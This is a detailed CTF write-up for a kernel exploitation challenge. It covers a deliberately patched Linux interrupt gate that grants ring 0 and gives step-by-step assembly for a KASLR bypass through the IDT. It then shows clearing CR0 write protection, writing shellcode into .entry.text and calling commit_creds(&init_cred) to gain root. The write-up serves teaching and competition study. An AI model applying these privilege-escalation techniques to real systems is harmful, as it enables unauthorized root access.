# Promotion - Kernel Pwn Writeup (BITS CTF 2025)

> **Flag:** `BITSCTF{pr0m0710n5_4r3_6r347._1f_1_0nly_h4d_4_j0b...}`
>
> **Category:** Pwn (Kernel Exploitation)
>
> **Description:** *"You just got promoted by your boss! What's the first thing you're doing?"*
>
> **Remote:** `nc 20.193.149.152 1337`

---

## Table of Contents

1. [Challenge Overview](#1-challenge-overview)
2. [Understanding the Environment](#2-understanding-the-environment)
3. [Extracting the Kernel and Symbols](#3-extracting-the-kernel-and-symbols)
4. [Analyzing the Vulnerability](#4-analyzing-the-vulnerability)
5. [Background: x86-64 Privilege Rings and Interrupts](#5-background-x86-64-privilege-rings-and-interrupts)
6. [Exploitation Strategy](#6-exploitation-strategy)
7. [Phase 1: Privilege Promotion to Ring 0](#7-phase-1-privilege-promotion-to-ring-0)
8. [Phase 1.1: KASLR Bypass via the IDT](#8-phase-11-kaslr-bypass-via-the-idt)
9. [Phase 1.2: Shellcode Construction and Patching](#9-phase-12-shellcode-construction-and-patching)
10. [Phase 1.3: Injecting Shellcode into Kernel Memory](#10-phase-13-injecting-shellcode-into-kernel-memory)
11. [Phase 2: Executing the Injected Shellcode](#11-phase-2-executing-the-injected-shellcode)
12. [Phase 3: Returning to Usermode as Root](#12-phase-3-returning-to-usermode-as-root)
13. [Phase 4: Reading the Flag](#13-phase-4-reading-the-flag)
14. [Failed Attempts and Lessons Learned](#14-failed-attempts-and-lessons-learned)
15. [Final Exploit: Pure Assembly Version](#15-final-exploit-pure-assembly-version)
16. [Remote Exploitation](#16-remote-exploitation)
17. [Complete Exploit Flow Diagram](#17-complete-exploit-flow-diagram)
18. [Glossary of Concepts](#18-glossary-of-concepts)
19. [Full Source Code](#19-full-source-code)

---

## 1. Challenge Overview

This is a **Linux kernel exploitation** challenge. We are given a custom-patched Linux kernel
running inside a QEMU virtual machine. The kernel has a deliberately introduced vulnerability
that we must find, understand, and exploit to escalate our privileges from a normal user
(UID 1000) to root (UID 0), then read the flag.

### Files Provided

| File | Purpose |
|------|---------|
| `bzImage` | Compressed Linux kernel image (what QEMU boots) |
| `rootfs.cpio.gz` | Root filesystem archive (contains the init script, busybox, etc.) |
| `run.sh` | QEMU launch script showing all boot parameters and mitigations |
| `diff.txt` | **The kernel patch** - this is where the vulnerability lives |

### The Goal

The flag is stored in a file that gets mounted as a virtual hard drive (`/dev/sda`) via
QEMU's `-hda` flag. Only root can read raw block devices. We start as `player` (UID 1000),
so we need to escalate to root.

---

## 2. Understanding the Environment

### Step 1: Analyzing the QEMU Launch Script (`run.sh`)

```bash
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel /challenge/bzImage \
    -initrd /challenge/rootfs.cpio.gz \
    -append "console=ttyS0 kaslr pti=on oops=panic panic=1 quiet" \
    -no-reboot \
    -cpu kvm64 \
    -snapshot \
    -hda /challenge/flag.txt \
    -monitor /dev/null
```

Let's break down every relevant parameter:

| Parameter | Meaning |
|-----------|---------|
| `-m 128M` | 128 MB of RAM for the VM |
| `-nographic` | No graphical window; serial console goes to terminal (important: this is how we interact) |
| `-kernel bzImage` | Boot this kernel directly (no bootloader) |
| `-initrd rootfs.cpio.gz` | Use this as the initial RAM filesystem |
| `-append "..."` | Kernel command line parameters (see below) |
| `-no-reboot` | If the kernel panics, shut down instead of rebooting (one shot only) |
| `-cpu kvm64` | Emulate a basic x86-64 CPU. **Crucially, this CPU does NOT support SMEP or SMAP** |
| `-snapshot` | Disk changes are not persisted |
| `-hda /challenge/flag.txt` | **Mount the flag file as the first hard drive (`/dev/sda`)** |
| `-monitor /dev/null` | Disable the QEMU monitor (prevents escape) |

### Kernel Command Line Mitigations

| Parameter | What It Does | Impact on Exploitation |
|-----------|-------------|----------------------|
| `kaslr` | **Kernel Address Space Layout Randomization** - the kernel is loaded at a random base address each boot. Kernel symbols (functions, global variables) move by a random offset. | We cannot hardcode kernel addresses. We need an info leak to find the kernel base. |
| `pti=on` | **Page Table Isolation** - the kernel maintains two separate sets of page tables: one for when the CPU is in kernel mode (has full kernel memory mapped) and one for when in user mode (kernel memory is mostly unmapped). When transitioning user→kernel, the CPU switches page tables via the CR3 register. | Even if we get ring 0, if we are on the "user" page tables, we cannot access most kernel data/code. We need to switch CR3 to kernel page tables. Also, user pages are marked NX (non-executable) in the kernel page tables. |
| `oops=panic` | A kernel "oops" (recoverable error) becomes a fatal panic instead. | We get exactly **one try**. Any mistake crashes the entire VM. No second chances. |
| `panic=1` | Reboot 1 second after panic. Combined with `-no-reboot`, the VM just dies. | Same as above - reinforces the "one shot" constraint. |

### Step 2: Analyzing the Root Filesystem

We extract the initramfs to understand what environment we land in:

```bash
mkdir rootfs && cd rootfs
gzip -dc ../rootfs.cpio.gz | cpio -idm
```

The `init` script reveals the boot process:

```sh
#!/bin/sh

# 1. Mount virtual filesystems
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs tmpfs /tmp

# 2. Hardening - restrict information leaks
echo 1 > /proc/sys/kernel/kptr_restrict   # Hide kernel addresses from /proc/kallsyms
echo 1 > /proc/sys/kernel/dmesg_restrict  # Non-root can't read dmesg
echo 2 > /proc/sys/kernel/perf_event_paranoid  # Restrict perf events

# 3. Set up user identity files
echo "root:x:0:0:root:/root:/bin/sh" > /etc/passwd
echo "player:x:1000:1000:player:/home/player:/bin/sh" >> /etc/passwd
echo "root:x:0:" > /etc/group
echo "player:x:1000:" >> /etc/group

# 5. Lock down system files
chown -R root:root /bin /sbin /etc /usr /init

# 6. Setup player environment
mkdir -p /home/player
chown -R player:player /home/player

# 7. Drop privileges and launch shell
exec cttyhack setuidgid 1000 sh
```

Key takeaways:
- **`kptr_restrict=1`**: We cannot read `/proc/kallsyms` as a normal user to find kernel addresses.
- **`dmesg_restrict=1`**: We cannot read kernel log messages (no info leaks from dmesg).
- **We start as UID 1000 (`player`)**: Not root. We need privilege escalation.
- **The filesystem is minimal**: Just busybox. No compiler on the target. We must bring our own exploit binary.

### Summary of Active Mitigations

| Mitigation | Status | Effect |
|------------|--------|--------|
| KASLR | **ON** | Kernel base randomized. Need info leak. |
| PTI (KPTI) | **ON** | Separate user/kernel page tables. User pages NX in kernel PTs. |
| SMEP | **OFF** (kvm64 CPU) | Kernel CAN execute user-mapped pages (if they were executable... but PTI makes them NX anyway). |
| SMAP | **OFF** (kvm64 CPU) | Kernel CAN read/write user-mapped pages. This is helpful for us. |
| kptr_restrict | **ON** | /proc/kallsyms hidden from non-root. |
| dmesg_restrict | **ON** | dmesg hidden from non-root. |
| oops=panic | **ON** | One shot - any kernel error is fatal. |

---

## 3. Extracting the Kernel and Symbols

To exploit the kernel, we need to know the exact addresses (offsets) of internal kernel
functions and data structures. The provided `bzImage` is a compressed kernel image. We
need to extract the uncompressed ELF binary (`vmlinux`) from it.

### Step 1: Find the Compressed Kernel Inside bzImage

`bzImage` is a self-extracting archive. It contains a small bootloader stub followed by
the gzip-compressed kernel. We use `binwalk` to find it:

```bash
$ binwalk bzImage | grep gzip
14448    0x3870   gzip compressed data, ...
```

### Step 2: Extract vmlinux

```bash
dd if=bzImage bs=1 skip=14448 | gzip -d > vmlinux
```

This gives us the raw uncompressed kernel binary. However, it's just a flat binary without
ELF headers or symbol information.

### Step 3: Reconstruct ELF with Symbols

We use `vmlinux-to-elf`, a tool that analyzes the kernel binary, finds the embedded
symbol table (kallsyms), and reconstructs a proper ELF file with all symbols:

```bash
pip install vmlinux-to-elf
vmlinux-to-elf vmlinux vmlinux_elf
```

The tool reports: **Linux kernel version 6.17.0-dirty**

This is important because kernel 6.17 has breaking changes that affect traditional
exploitation techniques (more on this later).

### Step 4: Find Key Symbol Offsets

Using `readelf`, `nm`, or `objdump` on `vmlinux_elf`, we extract the symbols we need:

```bash
$ nm vmlinux_elf | grep -E "asm_exc_promotion|commit_creds|init_cred|prepare_kernel_cred"
```

| Symbol | Absolute Address | Offset from `kernel_base` |
|--------|-----------------|--------------------------|
| `asm_exc_promotion` | `0xffffffff81001d30` | `0x1d30` |
| `commit_creds` | `0xffffffff8132afb0` | `0x32afb0` |
| `init_cred` | `0xffffffff82c54da0` | `0x1c54da0` |
| `prepare_kernel_cred` | `0xffffffff8132b250` | `0x32b250` |

The **kernel base** (without KASLR) is `0xffffffff81000000`. With KASLR, a random offset
is added to this base, and all symbols shift by the same amount. So if we can discover the
actual address of any one symbol at runtime, we can calculate all the others.

**What are these symbols?**

- **`asm_exc_promotion`**: The vulnerable interrupt handler added by the patch (vector 0x81).
- **`commit_creds(struct cred *new)`**: A kernel function that replaces the current process's
  credentials. If we call it with root credentials, our process becomes root.
- **`init_cred`**: A global `struct cred` in the kernel that holds UID=0 (root) credentials.
  This is the credential structure used by PID 1 (init) at boot.
- **`prepare_kernel_cred(struct task_struct *ref)`**: Traditionally used to create a new
  root credential by calling `prepare_kernel_cred(NULL)`. **Broken in kernel 6.17+** (returns NULL).

---

## 4. Analyzing the Vulnerability

The `diff.txt` file shows a patch to 3 files in the Linux kernel source. Let's analyze
each change in detail.

### Change 1: New Interrupt Vector Number (`irq_vectors.h`)

```c
#define IA32_SYSCALL_VECTOR    0x80    // existing: legacy 32-bit syscall
#define EXC_PROMOTION_VECTOR   0x81    // NEW: our target
```

This defines a new interrupt vector number, `0x81`, right after the legacy syscall vector
`0x80`. An interrupt vector is just a number (0-255) that identifies a specific handler
in the Interrupt Descriptor Table (IDT).

### Change 2: IDT Registration (`idt.c`)

```c
extern asmlinkage void asm_exc_promotion(void);

// In the def_idts[] table:
SYSG(X86_TRAP_OF,          asm_exc_overflow),   // existing entry
SYSG(EXC_PROMOTION_VECTOR, asm_exc_promotion),  // NEW entry
```

This registers our handler `asm_exc_promotion` at vector 0x81 using the **`SYSG` macro**.

**Why does SYSG matter?** The Linux kernel uses different macros to register IDT entries,
and each creates a different type of gate descriptor:

| Macro | Gate Type | DPL | Who Can Invoke | Stack Switch |
|-------|-----------|-----|----------------|--------------|
| `INTG` | Interrupt Gate | 0 | Kernel only | Yes (IST/TSS) |
| `SYSG` | System Gate (Trap) | **3** | **Anyone (ring 3)** | **No dedicated kernel stack** |
| `ISTG` | Interrupt Gate w/ IST | 0 | Kernel only | Yes (IST) |

`SYSG` creates a gate with **DPL=3** (Descriptor Privilege Level = 3). The DPL is the
**minimum privilege** required to use the `int` instruction with this vector. Since user
code runs at ring 3 (CPL=3), and DPL=3 means "ring 3 is allowed", any user process can
execute `int 0x81`.

For comparison, most kernel interrupt handlers use `INTG` (DPL=0), which means only
ring 0 code can invoke them via `int`. If userspace tries `int 0x81` on a DPL=0 gate,
the CPU generates a General Protection Fault (#GP) instead.

The only other `SYSG` entries in the default kernel are:
- `int 0x03` - breakpoint (used by debuggers)
- `int 0x04` - overflow
- `int 0x80` - legacy 32-bit syscall interface

### Change 3: The Handler Itself (`entry_64.S`)

```asm
.section .entry.text, "ax"

SYM_CODE_START(asm_exc_promotion)
    pushq %rax                 ; Save rax (we'll use it as scratch)
    movq  %cs, %rax            ; rax = current CS selector = 0x10 (kernel CS)
    movq  %rax, 16(%rsp)       ; Overwrite the CS field in the iret frame
    xorq  %rax, %rax           ; rax = 0
    movq  %rax, 40(%rsp)       ; Overwrite the SS field in the iret frame with 0
    popq  %rax                 ; Restore rax
    iretq                      ; Return from interrupt
SYM_CODE_END(asm_exc_promotion)
```

To understand what this does, we need to understand what the CPU does when it processes
`int 0x81`:

**What happens when userspace executes `int 0x81`:**

1. The CPU looks up entry 0x81 in the IDT.
2. Since this is a ring 3 → ring 0 transition, the CPU:
   a. Loads SS and RSP from the TSS (Task State Segment) - switching to the kernel stack.
   b. Pushes the following onto the **kernel stack** (this is the "iret frame"):

```
Kernel Stack (grows downward):
                    +--------+
    RSP + 40 →      |   SS   |  User's Stack Segment (0x2b for 64-bit userspace)
                    +--------+
    RSP + 32 →      |   RSP  |  User's Stack Pointer
                    +--------+
    RSP + 24 →      | RFLAGS |  User's flags register
                    +--------+
    RSP + 16 →      |   CS   |  User's Code Segment (0x33 for 64-bit userspace)
                    +--------+
    RSP + 8  →      |   RIP  |  User's instruction pointer (next instruction after int 0x81)
                    +--------+
    RSP + 0  →      |  (rax) |  Saved by the handler's "push rax"
                    +--------+
```

3. Loads CS with the segment selector from the IDT gate (0x10, kernel code segment).
4. Loads RIP with the handler address from the IDT gate.
5. Begins executing the handler.

**Now here's the vulnerability.** The handler does:

```
movq %cs, %rax          ; rax = 0x10 (kernel CS, because we're in the handler now)
movq %rax, 16(%rsp)     ; OVERWRITE the CS in the iret frame with 0x10
```

The handler replaces the **saved CS** in the iret frame. The iret frame's CS was originally
`0x33` (user code, ring 3). The handler replaces it with `0x10` (kernel code, ring 0).

It also zeros out SS:
```
xorq %rax, %rax
movq %rax, 40(%rsp)     ; SS = 0
```

Then it executes `iretq`, which pops all these values back. The CPU restores:
- **RIP** = the instruction right after our `int 0x81` (unchanged)
- **CS** = `0x10` (kernel code segment, **ring 0**) ← MODIFIED!
- **RFLAGS** = original flags (unchanged)
- **RSP** = our original user stack pointer (unchanged)
- **SS** = 0 (modified, but doesn't matter much)

**The result:** After `int 0x81` returns, our **user code continues executing**, but now
with **CS = 0x10 (ring 0)**. We are still on our user stack, still using user page tables,
but the CPU considers us to be running at **kernel privilege level**. This is the "promotion".

**What we can now do at ring 0:**
- Read/write control registers (CR0, CR3, CR4, etc.)
- Execute privileged instructions (cli, sti, wrmsr, lgdt, etc.)
- Access any memory mapped in the current page tables
- Read the IDT register (sidt) to find kernel addresses

**What we still cannot do (yet):**
- Access kernel memory that isn't mapped in the user page tables (PTI hides it)
- Execute kernel functions directly (they're in kernel-only pages)

---

## 5. Background: x86-64 Privilege Rings and Interrupts

If you're not familiar with x86-64 internals, here are the key concepts used in this exploit:

### Privilege Rings

x86-64 has 4 privilege levels (rings), but Linux only uses two:
- **Ring 0 (kernel mode)**: Full access to all instructions and memory. The kernel runs here.
- **Ring 3 (user mode)**: Restricted. Cannot execute privileged instructions or access kernel memory. User programs run here.

The current privilege level (CPL) is determined by the low 2 bits of the CS register:
- `CS = 0x33` → CPL = 3 (user mode) (0x33 & 3 = 3)
- `CS = 0x10` → CPL = 0 (kernel mode) (0x10 & 3 = 0)

### Page Tables and CR3

The CPU uses **page tables** to translate virtual addresses to physical addresses. The CR3
register points to the top-level page table (PGD - Page Global Directory).

With **PTI (Page Table Isolation)** enabled, Linux maintains **two sets of page tables**:
- **Kernel page tables**: Have everything mapped - both kernel and user memory.
- **User page tables**: Only have user memory mapped, plus a small "trampoline" area of
  kernel code needed for the user→kernel transition.

The two page tables share the same base address but differ in bits 11-12 of CR3:
- Kernel PTs: bits 11-12 = `00`
- User PTs: bits 11-12 = `11`

So to switch from user PTs to kernel PTs: `cr3 = cr3 & ~0x1800` (clear bits 11-12).

**Important PTI detail:** In the kernel page tables, user pages are mapped but have the
**NX (No Execute) bit set**. This means even at ring 0, if you're using kernel page tables,
you **cannot execute code from user memory**. This is a "software SMEP" enforced by PTI.

### The .entry.text Section

When the CPU transitions from user mode to kernel mode (e.g., via syscall or interrupt),
it needs to execute some kernel code **before** it can switch page tables. This code must
be mapped executable in **both** user and kernel page tables.

Linux places this code in a special section called **`.entry.text`**. It contains:
- Interrupt/exception entry points
- Syscall entry points
- The `swapgs` + CR3-switch trampoline code

This is the only kernel code executable from both page tables. Our vulnerable handler
`asm_exc_promotion` is placed in `.entry.text` (note the `.section .entry.text, "ax"` in
the patch). This becomes crucial for our exploit.

### swapgs

The `swapgs` instruction swaps the GS segment base register with the value stored in
`MSR_KERNEL_GS_BASE`. Linux uses the GS register to access per-CPU kernel data structures.

- In user mode: GS points to user-controlled data (TLS - Thread Local Storage).
- In kernel mode: GS points to per-CPU kernel data.

When entering the kernel, the standard entry code does `swapgs` to switch to kernel GS.
When returning to user mode, it does `swapgs` again to restore user GS.

If we are running user code at ring 0 (our situation), we need to `swapgs` before doing
anything kernel-related, and `swapgs` back before returning to user mode.

---

## 6. Exploitation Strategy

Given all the mitigations, let's enumerate what we need to accomplish and the obstacles:

### Requirements
1. **Find kernel addresses** (blocked by KASLR)
2. **Call `commit_creds(&init_cred)`** to become root (blocked by PTI - kernel functions
   are in kernel-only memory)
3. **Return to user mode cleanly** as UID 0 and read the flag

### Obstacles and Solutions

| Obstacle | Solution |
|----------|----------|
| KASLR hides kernel addresses | After promotion to ring 0, read the IDT to find `asm_exc_promotion`'s address, then compute `kernel_base` |
| PTI: kernel code not accessible from user PTs | Write shellcode into `.entry.text` (mapped in BOTH page tables), then execute it |
| PTI: kernel data not accessible from user PTs | The shellcode itself will switch CR3 to kernel PTs before calling `commit_creds` |
| `.entry.text` is read-only | Clear the WP (Write Protect) bit in CR0 to bypass read-only protection |
| `prepare_kernel_cred(NULL)` returns NULL on 6.17+ | Use `commit_creds(&init_cred)` directly instead |
| One shot only (oops=panic) | Be very careful. Test locally first. |

### Three-Phase Attack Plan

```
Phase 1: Setup (user code running at ring 0, user page tables)
  1. int 0x81 → promoted to ring 0
  2. cli + swapgs (prepare the environment)
  3. KASLR bypass: read IDT → get handler address → compute kernel_base
  4. Build shellcode with correct kernel addresses
  5. Disable CR0.WP → copy shellcode into .entry.text → re-enable CR0.WP
  6. int 0x81 → now triggers our shellcode

Phase 2: Privilege Escalation (our shellcode in .entry.text, ring 0)
  1. Switch CR3 to kernel page tables (clear bits 11-12)
  2. Call commit_creds(&init_cred) → our process is now UID 0
  3. Switch CR3 back to user page tables
  4. iretq → return to Phase 3

Phase 3: Cleanup and Flag (user code running at ring 0, then back to ring 3)
  1. swapgs (restore user GS)
  2. Build an iretq frame to return to ring 3
  3. iretq → back in user mode as root
  4. open("/dev/sda") → read → write to stdout → flag!
```

---

## 7. Phase 1: Privilege Promotion to Ring 0

### Saving User State

Before we enter ring 0, we need to save the current register state so we can return
to user mode later. Specifically, we need the values for an `iretq` frame:

```asm
; Save CS, SS, RSP, and RFLAGS for later iretq back to ring 3
mov [saved_cs], cs         ; CS = 0x33 (user code segment, ring 3)
mov [saved_ss], ss         ; SS = 0x2b (user data segment, ring 3)
mov rax, rsp
mov [saved_rsp], rax       ; RSP = current user stack pointer
pushfq                     ; Push RFLAGS onto stack
pop qword [saved_flags]    ; Save it to memory
```

We save these because after the exploit runs, we need to construct a proper `iretq` frame
to transition from ring 0 back to ring 3. The `iretq` instruction expects: SS, RSP,
RFLAGS, CS, RIP on the stack (in that order, with SS at the top/highest address).

### Triggering the Promotion

```asm
int 0x81
; After this returns: CS = 0x10 (ring 0!), everything else unchanged
```

That's it. One instruction. The CPU executes our patched handler, which modifies the
CS in the iret frame from 0x33 to 0x10, and returns. We are now at ring 0.

### Immediate Ring 0 Housekeeping

```asm
cli         ; Clear Interrupt Flag - disable hardware interrupts
swapgs      ; Swap GS base to kernel per-CPU data
```

**Why `cli`?** We are in a very fragile state: running user code at ring 0 with user page
tables. If a hardware interrupt fires (timer, disk, network), the CPU will try to handle
it using kernel infrastructure that may not be properly set up in our current context.
This would likely cause a crash. Disabling interrupts prevents this.

**Why `swapgs`?** The GS register currently points to user TLS data. Some kernel operations
(and the interrupt return path) expect GS to point to kernel per-CPU data. We swap it now
so things work correctly during our kernel operations, and we'll swap it back before
returning to user mode.

---

## 8. Phase 1.1: KASLR Bypass via the IDT

We need to find the kernel base address. KASLR means the kernel is loaded at a random
offset each boot. But now that we're at ring 0, we can read the **IDT Register (IDTR)**,
which contains the base address of the Interrupt Descriptor Table. The IDT contains the
addresses of all interrupt handlers, including our known `asm_exc_promotion`. By reading
its address, we can compute the kernel base.

### Reading the IDTR

```asm
sub rsp, 16          ; Make space on the stack (IDTR is 10 bytes)
sidt [rsp]           ; Store Interrupt Descriptor Table Register at [rsp]
mov rdi, [rsp+2]     ; Read the 8-byte IDT base address (skip 2-byte limit)
add rsp, 16          ; Clean up stack
```

The `sidt` instruction stores the IDTR, which has this format:
```
Bytes 0-1:  IDT Limit (size of the IDT minus 1)
Bytes 2-9:  IDT Base Address (64-bit virtual address of the IDT)
```

We skip the 2-byte limit and read the 8-byte base address into `rdi`.

### Parsing the IDT Gate Descriptor for Vector 0x81

The IDT is an array of gate descriptors. Each descriptor is 16 bytes. Vector 0x81 is at
offset `0x81 * 16 = 0x810` from the IDT base.

```asm
lea rsi, [rdi + 0x810]     ; rsi = pointer to IDT[0x81]
```

An x86-64 IDT Gate Descriptor has this layout (16 bytes):

```
 Byte:   0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15
        [Offset Low ]  [Selector]  [Flags  ]  [Offset Hi ]  [Reserved   ]
        [  15:0     ]  [ 31:16  ]  [       ]  [  63:32   ]  [           ]
                                    ^^^^
                                    Bytes 6-7 = Offset[31:16]
```

More precisely:
| Bytes | Field | Description |
|-------|-------|-------------|
| 0-1 | Offset[15:0] | Low 16 bits of the handler address |
| 2-3 | Segment Selector | Code segment selector (always 0x10 for kernel) |
| 4 | IST + reserved | Interrupt Stack Table entry (bits 0-2) |
| 5 | Type/Attributes | Gate type, DPL, Present bit |
| 6-7 | Offset[31:16] | Middle 16 bits of the handler address |
| 8-11 | Offset[63:32] | High 32 bits of the handler address |
| 12-15 | Reserved | Must be zero |

We need to reconstruct the full 64-bit handler address from three separate fields:

```asm
movzx eax, word [rsi]       ; eax = Offset[15:0]  (bytes 0-1)
mov   edx, [rsi+8]          ; edx = Offset[63:32] (bytes 8-11)
shl   rdx, 32               ; Shift high 32 bits into position
or    rax, rdx               ; rax = Offset[63:32] | Offset[15:0]
movzx edx, word [rsi+6]     ; edx = Offset[31:16] (bytes 6-7)
shl   rdx, 16               ; Shift middle 16 bits into position
or    rax, rdx               ; rax = full 64-bit handler address!
```

Now `rax` contains the actual runtime address of `asm_exc_promotion`.

### Computing the Kernel Base

From our symbol analysis (Step 4 in Section 3), we know that `asm_exc_promotion` is at
offset `0x1d30` from the kernel base. So:

```asm
sub rax, 0x1d30      ; rax = kernel_base (actual runtime address)
mov rbx, rax         ; Save kernel_base in rbx for later use
```

Now we have defeated KASLR. We can compute any kernel symbol's address as
`kernel_base + known_offset`.

---

## 9. Phase 1.2: Shellcode Construction and Patching

### Why Do We Need Shellcode?

We could try to call `commit_creds` directly from our user code. The problem is:

1. `commit_creds` and `init_cred` are in **kernel memory** that is not mapped in user
   page tables (PTI hides them).
2. If we switch CR3 to kernel page tables first, our **user code becomes non-executable**
   (PTI marks user pages as NX in kernel page tables).

So we have a chicken-and-egg problem:
- From user PTs: We can execute code but can't access kernel data/functions.
- From kernel PTs: We can access kernel data/functions but can't execute user code.

**Solution:** Write a small shellcode into `.entry.text`, which is the one region of kernel
memory that is mapped **executable in BOTH page tables**. Then trigger it.

### The Shellcode (41 bytes)

Here is the shellcode we inject, with a detailed explanation of each instruction:

```
Offset  Bytes                          Assembly              Purpose
------  -----                          --------              -------
0x00    0f 20 d8                       mov rax, cr3          ; Read current CR3 (user page tables)
0x03    50                             push rax              ; Save it on the stack
0x04    48 25 ff e7 ff ff              and rax, 0xffffe7ff   ; Clear bits 11-12 (PTI bits)
0x0a    0f 22 d8                       mov cr3, rax          ; Switch to kernel page tables
0x0d    48 bf XX XX XX XX XX XX XX XX  movabs rdi, <addr>    ; rdi = &init_cred (patched at runtime)
0x17    48 b8 XX XX XX XX XX XX XX XX  movabs rax, <addr>    ; rax = &commit_creds (patched at runtime)
0x21    ff d0                          call rax              ; commit_creds(&init_cred)
0x23    58                             pop rax               ; Restore saved user CR3
0x24    0f 22 d8                       mov cr3, rax          ; Switch back to user page tables
0x27    48 cf                          iretq                 ; Return to caller
```

**Line-by-line walkthrough:**

1. **`mov rax, cr3`** - Read the current CR3 register value. This is the user page table
   base address (since we're still on user PTs when this runs).

2. **`push rax`** - Save the user CR3 on the stack. We'll need it later to switch back.

3. **`and rax, 0xffffffffffffe7ff`** - This clears bits 11 and 12 of CR3. With PTI, the
   user page tables have bits 11-12 set to select the "user" page table. Clearing these
   bits selects the "kernel" page table, which has the full kernel memory mapped. The mask
   `0xffffffffffffe7ff` = `~0x1800` = clear bits 11 (`0x800`) and 12 (`0x1000`).

4. **`mov cr3, rax`** - Write the modified value back to CR3. This immediately switches
   the active page tables to the kernel page tables. Now we can access all kernel memory.

5. **`movabs rdi, <init_cred_address>`** - Load the absolute address of `init_cred` into
   RDI. In the x86-64 calling convention, RDI is the first function argument. We're
   setting up the argument for `commit_creds`. The 8-byte address at offset 0x0F is a
   placeholder that gets patched with the real KASLR-adjusted address at runtime.

6. **`movabs rax, <commit_creds_address>`** - Load the absolute address of `commit_creds`
   into RAX. Same as above - patched at runtime.

7. **`call rax`** - Call `commit_creds(&init_cred)`. This kernel function takes a pointer
   to a `struct cred` and sets the current process's credentials to match it. Since
   `init_cred` has UID=0, GID=0, and full capabilities, our process becomes root.

8. **`pop rax`** - Restore the saved user CR3 value from the stack.

9. **`mov cr3, rax`** - Switch back to user page tables. We need to do this before `iretq`
   because the code we're returning to is in user memory, which might not be executable
   in kernel PTs.

10. **`iretq`** - Return from the interrupt. This pops the iret frame (RIP, CS, RFLAGS,
    RSP, SS) and resumes execution at the return address. Since we arrived here via
    `int 0x81`, the iret frame was set up by the CPU and will return us to right after
    the `int 0x81` instruction.

### Patching the Shellcode with KASLR-Adjusted Addresses

The shellcode template has zeroed-out placeholder addresses at offsets 15 and 25. We
need to fill these with the actual runtime addresses:

```asm
; Compute init_cred address = kernel_base + 0x1c54da0
lea rax, [rbx + 0x1c54da0]          ; rbx = kernel_base (from KASLR bypass)
mov [rel shellcode + sc_init_off], rax  ; Write to offset 15 in shellcode

; Compute commit_creds address = kernel_base + 0x32afb0
lea rax, [rbx + 0x32afb0]
mov [rel shellcode + sc_cc_off], rax    ; Write to offset 25 in shellcode
```

After this, the shellcode contains the correct absolute addresses for this boot's
KASLR layout.

---

## 10. Phase 1.3: Injecting Shellcode into Kernel Memory

### The Problem: `.entry.text` is Read-Only

Even though we're at ring 0, the kernel's `.entry.text` section is mapped as read-only.
If we try to write to it directly, we'll get a page fault. However, at ring 0, we can
control this behavior.

### The Solution: Clear CR0.WP

The **CR0** register has a **WP (Write Protect) bit** (bit 16). When WP=1, the CPU
enforces read-only page protections even at ring 0 (the kernel can't accidentally write
to read-only pages). When WP=0, ring 0 code can write to any mapped page regardless of
its read-only flag.

```asm
; Read current CR0 and save it
mov rax, cr0
mov r15, rax               ; Save original CR0 in r15

; Clear WP bit (bit 16)
and eax, ~(1 << 16)       ; ~(1 << 16) = ~0x10000 = 0xFFFEFFFF
mov cr0, rax               ; Write back - now we can write to read-only pages
```

### Copying the Shellcode

Now we copy our 41-byte shellcode to the address of `asm_exc_promotion` in `.entry.text`:

```asm
; Destination: asm_exc_promotion = kernel_base + 0x1d30
lea rdi, [rbx + 0x1d30]    ; rdi = destination address

; Source: our shellcode in user memory (still accessible because SMAP is off)
lea rsi, [rel shellcode]    ; rsi = source address

; Copy 41 bytes
mov ecx, sc_len             ; ecx = 41 (shellcode length), sc_len is an assembly constant
rep movsb                   ; memcpy(rdi, rsi, ecx)
```

**Why does this work?** The `rep movsb` instruction copies ECX bytes from [RSI] to [RDI].
Even though the destination is in kernel memory (.entry.text), it's mapped in the user
page tables (because .entry.text must be accessible during transitions). And we just
disabled write protection, so the read-only flag is ignored.

**Note about SMAP:** Normally, reading user memory from ring 0 would be blocked by SMAP
(Supervisor Mode Access Prevention). But the `-cpu kvm64` QEMU flag means SMAP is not
available, so we can freely access user memory from ring 0. This is why `lea rsi,
[rel shellcode]` works - the shellcode source is in user memory.

### Restoring Write Protection

```asm
mov cr0, r15               ; Restore original CR0 (with WP bit set)
```

It's good practice to restore WP to avoid leaving the kernel in a weakened state. It also
avoids potential issues with the kernel detecting that WP was cleared.

---

## 11. Phase 2: Executing the Injected Shellcode

Now `asm_exc_promotion` contains our shellcode instead of the original handler. We trigger
it with another `int 0x81`:

```asm
int 0x81
```

Here's what happens step by step:

1. **CPU processes `int 0x81`:** Since we're already at ring 0, this is a same-privilege
   interrupt. In 64-bit mode, the CPU **always** pushes a full iret frame (SS, RSP,
   RFLAGS, CS, RIP), even for same-privilege interrupts. It does NOT switch to a different
   stack (no TSS/IST involved for SYSG gates).

2. **CPU jumps to the handler:** The handler address in IDT[0x81] is `asm_exc_promotion`,
   which now contains our shellcode.

3. **Our shellcode executes:**
   - Switches CR3 to kernel page tables (now we can access all kernel memory)
   - Calls `commit_creds(&init_cred)` - this modifies our process's credentials to root
   - Switches CR3 back to user page tables
   - `iretq` returns to the instruction after `int 0x81`

4. **Control returns to us:** We're back in our code, still at ring 0, but now our process
   has UID=0 credentials.

**Why does the shellcode need to switch CR3?**

The `commit_creds` function and `init_cred` variable are in kernel memory that is only
mapped in the kernel page tables. If we try to call `commit_creds` while on user page
tables, we'd get a page fault because the address doesn't resolve to anything. By switching
to kernel PTs first, we make the entire kernel address space accessible.

**Why does the shellcode switch CR3 back before `iretq`?**

After `iretq`, execution returns to our user code (the instruction after `int 0x81`). Our
user code is in user memory. In the kernel page tables, user memory is marked NX
(non-executable) due to PTI. If we returned with kernel PTs active, the CPU would fault
when trying to execute user code. So we switch back to user PTs first.

---

## 12. Phase 3: Returning to Usermode as Root

At this point we are:
- Running our user code at ring 0 (CS = 0x10)
- On user page tables
- Our process credentials are now UID 0 (root)

We need to transition cleanly back to ring 3 (user mode) so we can use normal syscalls
to read the flag.

### Restoring GS

```asm
swapgs      ; Swap kernel GS back to user GS
```

We did `swapgs` at the start of Phase 1 to switch to kernel GS. Now we need to swap back
to user GS before returning to user mode, otherwise user-mode code that accesses TLS
(thread-local storage) via GS will crash.

### Building the iretq Frame

The `iretq` instruction is the standard way to transition from ring 0 to ring 3 (or any
privilege level change). It pops 5 values from the stack:

```
Stack (top to bottom, RSP increasing):
